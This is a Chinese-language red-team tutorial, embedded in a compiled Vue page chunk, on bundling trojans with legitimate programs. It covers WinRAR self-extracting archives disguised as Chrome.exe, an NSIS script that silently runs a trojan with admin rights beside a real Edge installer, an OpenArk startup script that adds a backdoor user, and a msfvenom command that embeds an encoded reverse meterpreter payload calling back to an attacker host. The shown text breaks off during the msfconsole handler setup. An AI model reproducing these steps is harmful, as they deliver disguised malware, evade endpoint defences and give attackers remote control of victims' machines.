import{_ as s}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,a as l,o as e}from"./app-CFt4SMiv.js";const n={};function h(t,i){return e(),a("div",null,i[0]||(i[0]=[l(`<h1 id="捆绑程序" tabindex="-1"><a class="header-anchor" href="#捆绑程序"><span>捆绑程序</span></a></h1><hr><ul><li><a href="#%E6%8D%86%E7%BB%91%E7%A8%8B%E5%BA%8F">捆绑程序</a><ul><li><a href="#%E5%88%A9%E7%94%A8winrar%E5%88%9B%E5%BB%BAsfx%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%89%93%E5%8C%85%E6%8D%86%E7%BB%91%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E4%B8%8E%E5%90%88%E6%B3%95%E7%A8%8B%E5%BA%8F">利用Winrar创建SFX(自解压)打包捆绑恶意程序与合法程序</a><ul><li><a href="#%E7%9B%B8%E5%85%B3%E9%93%BE%E6%8E%A5">相关链接</a></li></ul></li><li><a href="#nsis%E6%8D%86%E7%BB%91%E7%A8%8B%E5%BA%8F">NSIS捆绑程序</a></li><li><a href="#openark%E6%8D%86%E7%BB%91%E7%A8%8B%E5%BA%8F">OpenArk捆绑程序</a><ul><li><a href="#%E5%88%B6%E4%BD%9C%E6%AD%A5%E9%AA%A4">制作步骤</a></li></ul></li><li><a href="#msfvenom%E6%8D%86%E7%BB%91%E7%A8%8B%E5%BA%8F">msfvenom捆绑程序</a></li><li><a href="#cpp%E5%AE%9E%E7%8E%B0%E6%8D%86%E7%BB%91%E7%A8%8B%E5%BA%8Ftodo">cpp实现捆绑程序(TODO)</a><ul><li><a href="#threadproc">threadProc</a></li><li><a href="#main">main</a><ul><li><a href="#%E4%BB%8E%E8%B5%84%E6%BA%90%E4%B8%AD%E6%8F%90%E5%8F%96-docx-%E6%96%87%E4%BB%B6">从资源中提取 .docx 文件</a></li><li><a href="#%E6%89%93%E5%BC%80-docx-%E6%96%87%E4%BB%B6">打开 .docx 文件</a></li><li><a href="#%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%88%A0%E9%99%A4">实现自删除</a></li></ul></li></ul></li><li><a href="#todo">TODO</a></li></ul></li></ul><hr><h2 id="利用winrar创建sfx-自解压-打包捆绑恶意程序与合法程序" tabindex="-1"><a class="header-anchor" href="#利用winrar创建sfx-自解压-打包捆绑恶意程序与合法程序"><span>利用Winrar创建SFX(自解压)打包捆绑恶意程序与合法程序</span></a></h2><blockquote><p><a href="https://twitter.com/binitamshah/status/1784612260624932990" target="_blank" rel="noopener noreferrer">X 上的 Binni Shah：“Embed A Malicious Executable in a Normal PDF or EXE : https://t.co/Uko8EQhzFj https://t.co/512NXzey0d” / X (twitter.com)</a></p><p><a href="https://medium.com/@sam.rothlisberger/embed-a-malicious-executable-in-a-normal-pdf-or-exe-81ee5339707e" target="_blank" rel="noopener noreferrer">在普通 PDF 或 EXE 中嵌入恶意可执行文件 |作者：萨姆·罗斯利斯伯格 |中等的 --- Embed A Malicious Executable in a Normal PDF or EXE | by Sam Rothlisberger | Medium</a></p><p><a href="https://www.rarlab.com/download.htm?source=post_page-----81ee5339707e--------------------------------" target="_blank" rel="noopener noreferrer">WinRAR 归档程序，处理 RAR 和 ZIP 文件的强大工具 --- WinRAR archiver, a powerful tool to process RAR and ZIP files (rarlab.com)</a></p><hr><p><a href="https://www.cnblogs.com/thespace/p/15520945.html" target="_blank" rel="noopener noreferrer">自解压捆绑文件钓鱼 - the苍穹 - 博客园 (cnblogs.com)</a></p></blockquote><p>可以在 <a href="https://www.rarlab.com/download.htm?source=post_page-----81ee5339707e--------------------------------" target="_blank" rel="noopener noreferrer">WinRAR archiver, a powerful tool to process RAR and ZIP files (rarlab.com)</a> 下载 WinRAR, 使用 Winrar 将恶意软件和合法软件捆绑起来, 通过合法软件调用恶意软件在一定程度上可以绕过EDR</p><p>可以在 <a href="https://www.iconfinder.com/search?q=chrome" target="_blank" rel="noopener noreferrer">383 chrome icons - Iconfinder</a> 查找目标合法软件的图标并下载 PNG 文件</p><p>可以使用 <code>https://iconconverter.com</code> 将 PNG 转换成 ICO 图标</p><blockquote><p>文中提到的这个网站我刚问不到, 拿 Go 写了个转换程序: <a href="https://github.com/Ayusummer/DailyNotesCode/blob/main/Go/usecase/Picture/ToICO/main.go" target="_blank" rel="noopener noreferrer">DailyNotesCode/Go/usecase/Picture/ToICO/main.go at main · Ayusummer/DailyNotesCode (github.com)</a></p><p>常见程序 ICO 分辨率:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/image-20240429162640096.png" alt="image-20240429162640096"></p></blockquote><p>选中 Chrome 浏览器快捷方式和恶意程序, 使用 WinRAR <code>Add to Archive</code> 来创建压缩包</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/image-20240429150415492.png" alt="image-20240429150415492"></p><p>起一个合适的名字, 例如 <code>Chrome.exe</code> 并确保选中了 <code>Create SFX archive</code></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/image-20240429151231670.png" alt="image-20240429151231670"></p><p>继续在 <code>Advance -&gt; SFX options -&gt; Setup</code> 中配置启动项</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/image-20240429151743366.png" alt="image-20240429151743366"></p><blockquote><p>如果你的恶意程序是阻塞性质的程序那么在写 <code>Run after extraction</code> 的时候如果恶意程序在前则会在其关闭时调起 Chrome, 反之则会在 Chrome 关闭后调起恶意程序</p></blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/image-20240429151758013.png" alt="image-20240429151758013"></p><p>在 <code>Modes</code> 中设置解压到临时目录以及 <code>Hide all</code></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/image-20240429151843345.png" alt="image-20240429151843345"></p><p>在 <a href="https://www.iconfinder.com/search?q=chrome" target="_blank" rel="noopener noreferrer">383 chrome icons - Iconfinder</a> 查找目标合法软件的图标并下载 PNG 文件, 然后用工具转换成 ICO 文件并在 <code>Text and icon -&gt; Load SFX icon from the file</code> 设置 ico 图标</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/image-20240429152043450.png" alt="image-20240429152043450"></p><p>在 <code>Update</code> 中选择 <code>Extract and update files</code> 以及 <code>Overwrite all files</code></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/image-20240429152204461.png" alt="image-20240429152204461"></p><p>最后逐级确定即可收获一个名为 <code>Chrome.exe</code> 且带有合适图标的可执行程序</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/image-20240429152352945.png" alt="image-20240429152352945"></p><p>此时执行 <code>Chrome.exe</code> 即可打开 Chrome 并执行恶意程序</p><blockquote><p>PS: 如果你的恶意程序是阻塞性质的程序那么在写 <code>Run after extraction</code> 的时候如果恶意程序在前则会在其关闭时调起 Chrome, 反之则会在 Chrome 关闭后调起恶意程序</p></blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/image-20240429153043430.png" alt="image-20240429153043430"></p><hr><h3 id="相关链接" tabindex="-1"><a class="header-anchor" href="#相关链接"><span>相关链接</span></a></h3><ul><li><a href="https://www.jianshu.com/p/dcd250593698" target="_blank" rel="noopener noreferrer">钓鱼姿势汇总 - 简书 (jianshu.com)</a></li><li><a href="https://xz.aliyun.com/t/10339?time__1311=Cqjx2QD%3DiteWqGNDQimOgbtDtt0QtDReOYD" target="_blank" rel="noopener noreferrer">常见钓鱼招式 - 先知社区 (aliyun.com)</a></li><li><a href="https://xz.aliyun.com/t/7958?time__1311=n4%2BxnD0DyDu7%3D0KDtD%2FiW%2B%2BDRxWwET%2B2qiKYQx&amp;u_atoken=b3f182c7de2346300545cf550b675aaa&amp;u_asession=01aVloK8zdyz1jbLMCfi3Rb_nJ-DNhv22v_SsASnWdWOhSTG5nkI4iMtai7iaLZyHuJB-YY_UqRErInTL5mMzm-GyPlBJUEqctiaTooWaXr7I&amp;u_asig=05gKuE463GuJgxD-1Hv2Y2uZaxRpUSO3DG9gh-nfltKMhcVUJcYDIKhn1cPVoXgiX5Df3xrlAPX8bST2J8VKtKoNwjn6RJZ9QRez5qff0CPQnpkgY-U-QL2U-ethMX_CJYuNKBFuPaIRLct_EkBTqITpoHnpM5IKnnIeTDjpFaYXXBzhvSc0Kr8URjOX9Xe4tkzFbVi2r-pBzp0QGXRl_7EMxyjhjxVMvGJkctdPlLhh8n4lDAq4p9hSzpFkmzwmT0xUBlYPVbTlxERd8HS2DtjMomX-SUxGBermG0wjWT8qJ6gx6UxFgdF3ARCQ86jS_u_XR5hatHQVh06VuUZ-D1wA&amp;u_aref=N2juT3KkWH9z0pLtcs9KFrZ%2FzQw%3D" target="_blank" rel="noopener noreferrer">红队攻防系列之花式鱼竿钓鱼篇 - 先知社区 (aliyun.com)</a></li></ul><hr><h2 id="nsis捆绑程序" tabindex="-1"><a class="header-anchor" href="#nsis捆绑程序"><span>NSIS捆绑程序</span></a></h2><blockquote><p><a href="https://saucer-man.com/information_security/1168.html" target="_blank" rel="noopener noreferrer">捆绑马的制作 - yanq的个人博客 (saucer-man.com)</a></p></blockquote><p>NSIS（Nullsoft Scriptable Install System）是一个专业的开源系统，用于创建 Windows 安装程序。</p><p>NSIS 可以用于创建能够安装、卸载、设置系统设置、提取文件等的安装程序。基于脚本文件，所以使用简单方便，同时也是免费软件，无需破解，其下载地址为https://nsis.sourceforge.io/Download</p><p>NSIS 是编译器，需要编写nsi脚本然后编译。</p><p>配置 NSIS 环境变量, 以便后续可以方便调用 <code>makensis.exe</code>, 默认路径为</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>C:\\Program Files (x86)\\NSIS</span></span>
<span class="line"><span>C:\\Program Files (x86)\\NSIS\\Bin</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>安装 VSCode 扩展 NSIS</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407171750185.png" alt="image-20240717175046654"></p><p>编写如下 nsis 文件, 具体可参阅 <a href="https://nsis.sourceforge.io/Docs/" target="_blank" rel="noopener noreferrer">NSIS Users Manual (sourceforge.io)</a></p><div class="language-nsis line-numbers-mode" data-highlighter="shiki" data-ext="nsis" data-title="nsis" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>; 设置编译结果的输出文件</span></span>
<span class="line"><span>OutFile &quot;安装包.exe&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>; 设置exe的图标</span></span>
<span class="line"><span>Icon &quot;1.ico&quot; </span></span>
<span class="line"><span></span></span>
<span class="line"><span>; 直接请求uac 提权</span></span>
<span class="line"><span>RequestExecutionLevel admin </span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>!include &quot;FileFunc.nsh&quot; </span></span>
<span class="line"><span></span></span>
<span class="line"><span>; 静默安装，调试的时候可以把这个关了，实际运行的时候要开静默</span></span>
<span class="line"><span>SilentInstall silent  </span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>; 初始化脚本</span></span>
<span class="line"><span>; 安装程序开始执行之前完成的任务</span></span>
<span class="line"><span>; 这里可以检查木马文件是否已经存在了，但是这里我先不做这么多</span></span>
<span class="line"><span>Function .onInit</span></span>
<span class="line"><span>  </span></span>
<span class="line"><span>FunctionEnd</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>; 开始安装步骤1，将&quot;木马.exe&quot;复制到&quot;$TEMP\\xxxxx&quot;</span></span>
<span class="line"><span>Section &quot;Section1&quot; SEC01</span></span>
<span class="line"><span>    ; 这里设置一个目录，下面的文件都会被释放到这个目录底下，目录不存在的话会自动创建目录</span></span>
<span class="line"><span>    SetOutPath  &quot;$TEMP\\xxxxx&quot;</span></span>
<span class="line"><span>    ; 指定安装包在打包时要包含进那些文件，安装时会将&quot;木马.exe&quot;释放到&quot;$TEMP\\xxxxx&quot;</span></span>
<span class="line"><span>    File &quot;木马.exe&quot; </span></span>
<span class="line"><span></span></span>
<span class="line"><span>SectionEnd</span></span>
<span class="line"><span></span></span>
<span class="line"><span>; 开始安装步骤2，将&quot;正常文件.exe&quot;复制到&quot;$TEMP\\xxxx2&quot;</span></span>
<span class="line"><span>Section &quot;Section2&quot; SEC02</span></span>
<span class="line"><span>    SetOutPath &quot;$TEMP\\xxxx2&quot;</span></span>
<span class="line"><span>    File &quot;正常文件.exe&quot;</span></span>
<span class="line"><span>SectionEnd</span></span>
<span class="line"><span></span></span>
<span class="line"><span>; 会在安装成功后执行，这里就直接执行exe就好了</span></span>
<span class="line"><span>Function .onInstSuccess</span></span>
<span class="line"><span>  Exec &quot;$TEMP\\xxxxx\\木马.exe&quot;</span></span>
<span class="line"><span>  Exec &quot;$TEMP\\xxxx2\\正常文件.exe</span></span>
<span class="line"><span>  ; 打开文档可以用下面的命令</span></span>
<span class="line"><span>  ; ExecShell open  &quot;$TEMP\\测试文档.docx&quot;</span></span>
<span class="line"><span>FunctionEnd</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>例如</p><div class="language-nsis line-numbers-mode" data-highlighter="shiki" data-ext="nsis" data-title="nsis" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>OutFile &quot;MicrosoftEdgeSetupNSIS.exe&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Icon &quot;IDR_MAINFRAME.ico&quot; </span></span>
<span class="line"><span></span></span>
<span class="line"><span>RequestExecutionLevel admin </span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>!include &quot;FileFunc.nsh&quot; </span></span>
<span class="line"><span></span></span>
<span class="line"><span>SilentInstall silent  </span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>Function .onInit</span></span>
<span class="line"><span>  </span></span>
<span class="line"><span>FunctionEnd</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>Section &quot;Section1&quot; SEC01</span></span>
<span class="line"><span>    SetOutPath  &quot;$TEMP&quot;</span></span>
<span class="line"><span>    File &quot;msedge.exe&quot; </span></span>
<span class="line"><span></span></span>
<span class="line"><span>SectionEnd</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Section &quot;Section2&quot; SEC02</span></span>
<span class="line"><span>    SetOutPath &quot;$TEMP&quot;</span></span>
<span class="line"><span>    File &quot;MicrosoftEdgeSetup.exe&quot;</span></span>
<span class="line"><span>SectionEnd</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Function .onInstSuccess</span></span>
<span class="line"><span>  Exec &quot;$TEMP\\msedge.exe&quot;</span></span>
<span class="line"><span>  Exec &quot;$TEMP\\MicrosoftEdgeSetup.exe&quot;</span></span>
<span class="line"><span>FunctionEnd</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后呼出 VSCode 命令面板(<code>Ctrl+Shift+P</code>), 输入 <code>nsis</code> 选择 <code>NSIS:Create Build Task</code></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407181019336.png" alt="image-20240718101908801"></p><p>这会在当前项目根目录创建一个 <code>.vscode/task.json</code> 文件, 内容大概如下:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407181032137.png" alt="image-20240718103201982"></p><p>接下来将窗口切回到刚才编写的 NSIS 文件, <code>Ctrl+Shift+P</code> 呼出命令面板, 选择 <code>Tasks:Run Build Task</code></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407181034116.png" alt="image-20240718103435988"></p><p>这将会根据 <code>tasks.json</code> 中的配置来 build 当前 nsis 任务</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407181036498.png" alt="image-20240718103632395"></p><p>运行编译生成文件会弹出 UAC 授权窗口， 点击确定后即会运行程序</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407181041070.png" alt="image-20240718104156954"></p><p>运行恶意程序上线攻击机并且运行正常程序下载 Microsoft Edge:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407181043302.png" alt="image-20240718104349211"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407181042143.png" alt="image-20240718104217051"></p><hr><h2 id="openark捆绑程序" tabindex="-1"><a class="header-anchor" href="#openark捆绑程序"><span>OpenArk捆绑程序</span></a></h2><blockquote><p><a href="https://openark.blackint3.com/manuals/CN/%E6%8D%86%E7%BB%91%E5%99%A8/%E5%88%B6%E4%BD%9C%E6%8D%86%E7%BB%91%E7%A8%8B%E5%BA%8F/" target="_blank" rel="noopener noreferrer">制作一个捆绑程序 - OpenArk Manuals (blackint3.com)</a></p><p><a href="https://github.com/BlackINT3/OpenArk/blob/master/doc/README-zh.md" target="_blank" rel="noopener noreferrer">OpenArk/doc/README-zh.md at master · BlackINT3/OpenArk · GitHub</a></p></blockquote><p>OpenArk是一款Windows平台上的开源Ark工具. Ark是Anti-Rootkit（对抗恶意程序）的简写, OpenArk目标成为逆向工程师、编程人员的工具，同时也能为那些希望清理恶意软件的用户服务。</p><p>可以在 <a href="https://github.com/BlackINT3/OpenArk/releases/" target="_blank" rel="noopener noreferrer">Releases · BlackINT3/OpenArk (github.com)</a> 下载 OpenArk</p><p>捆绑程序是将一个或多个程序绑定成一个独立的exe，避免依赖的文件（如DLL）过多而影响传输/存储，常用于一些恶意软件。 OpenArk的Bundler即是这样一个功能，支持文件以及文件夹等捆绑成一个exe，同样支持脚本。</p><hr><h3 id="制作步骤" tabindex="-1"><a class="header-anchor" href="#制作步骤"><span>制作步骤</span></a></h3><p><a href="https://openark.blackint3.com/manuals/CN/%E6%8D%86%E7%BB%91%E5%99%A8/%E5%88%B6%E4%BD%9C%E6%8D%86%E7%BB%91%E7%A8%8B%E5%BA%8F/" target="_blank" rel="noopener noreferrer">制作一个捆绑程序 - OpenArk Manuals (blackint3.com)</a> 文档中讲述了捆绑合法程序以及新建用户命令和vbs.bat脚本的方法, 这里演示捆绑合法程序和恶意程序</p><p>这里选择捆绑恶意程序和 MSEdge, edge 直接捆绑个快捷方式就行了, 将恶意程序和 edge快捷方式放到一个文件夹中并将该文件夹拖入到 OpenArk 的 Bundler 中(默认管理员)(或者使用右上角<code>选择文件夹</code> 按钮指定目标文件夹)</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407171115466.png" alt="image-20240717111536127"></p><p>在左下角 <code>启动脚本</code> 区域写入要执行的脚本, 例如这里应当是启动恶意程序以及合法程序</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>call %root%/./msedge.exe</span></span>
<span class="line"><span>call %root%/./Microsoft Edge.lnk</span></span>
<span class="line"><span>clean //清理释放后的文件</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>PS: 一些额外启动脚本代码示例:</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>cmd net user shadow 123 /add     //添加一个用户shadow</span></span>
<span class="line"><span>start cmd /c %root%\\shadow.bat   //执行测试的bat</span></span>
<span class="line"><span>start wscript %root%\\shadow.vbs  //执行测试vbs</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></blockquote><hr><p>点击左下角 <code>选择图标</code> 按钮选择生成程序的图标然后点击右下角的 <code>生成</code> 按钮即可生成捆绑程序</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407171128899.png" alt="image-20240717112857786"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407171135121.png" alt="image-20240717113544992"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407171136547.png" alt="image-20240717113610390"></p><hr><h2 id="msfvenom捆绑程序" tabindex="-1"><a class="header-anchor" href="#msfvenom捆绑程序"><span>msfvenom捆绑程序</span></a></h2><blockquote><p><a href="https://cloud.tencent.com/developer/article/1699911" target="_blank" rel="noopener noreferrer">msf之木马程序-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p><a href="https://blog.csdn.net/qq_44874645/article/details/118525837" target="_blank" rel="noopener noreferrer">【渗透测试笔记】之【钓鱼姿势——exe捆绑与免杀】-CSDN博客</a></p></blockquote><p>准备好目标程序(这里选择了Microsoft Edge安装包, 放在了 <code>/root/temp/MicrosoftEdgeSetup.exe</code>)</p><p>使用 msfvenom 生成捆绑木马</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">msfvenom</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> windows/meterpreter/reverse_http</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> lhost=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">100.1.1.131</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> lport=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">55555</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -e</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> x86/shikata_ga_nai</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -i</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 15</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -f</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> exe</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;\\x00\\x0a\\x0d&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -x</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /root/temp/MicrosoftEdgeSetup.exe</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/root/temp/out/MicrosoftEdgeSetup.exe</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><ul><li><p><code>-p</code>：指定后面的 payload</p><p><code>windows/meterpreter/reverse_tcp</code>：申明这是一个windows系统下的一个反弹http</p></li><li><p><code>LHOST=192.168.0.108,</code>：设置反弹回来的ip，即你的kali的ip地址</p></li><li><p><code>lport</code> 反弹端口(默认返回端口是4444)</p></li><li><p><code>-e</code>: 指定编码器 <code>x86/shikata_ga_nai</code></p></li><li><p><code>-i</code>: 指定编码次数</p></li><li><p><code>-f</code>： 捆绑的文件类型，这里是一个exe文件</p></li><li><p><code>-b</code>: 指定需要避开的坏字符（通常是由于这些字符在payload中会引起问题）</p><p>这里是避免使用<code>\\x00</code>（null字节）、<code>\\x0a</code>（换行符）和<code>\\x0d</code>（回车符）。</p></li><li><p><code>-x</code>：指定捆绑的文件路径</p></li><li><p><code>-o</code>：指定生成木马的文件路径</p></li></ul><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407171449258.png" alt="image-20240717144916986"></p><p><code>msconsole</code> 起监听</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">msfconsole</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">msf6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">use</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> multi/handler</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[*] Using configured payload generic/shell_reverse_http</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">msf6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> exploit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">multi/handler</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> payload</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> windows/meterpreter/reverse_tcp</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">payload</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> =&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">windows/meterpreter/reverse_tcp</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">msf6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> exploit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">multi/handler</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> lhost</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 100.1.1.131</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">lhost</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> =&gt; </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">100.1.1.131</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">msf6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> exploit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">multi/handler</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> lport</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 55555</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">lport</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> =&gt; </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">55555</span></span>
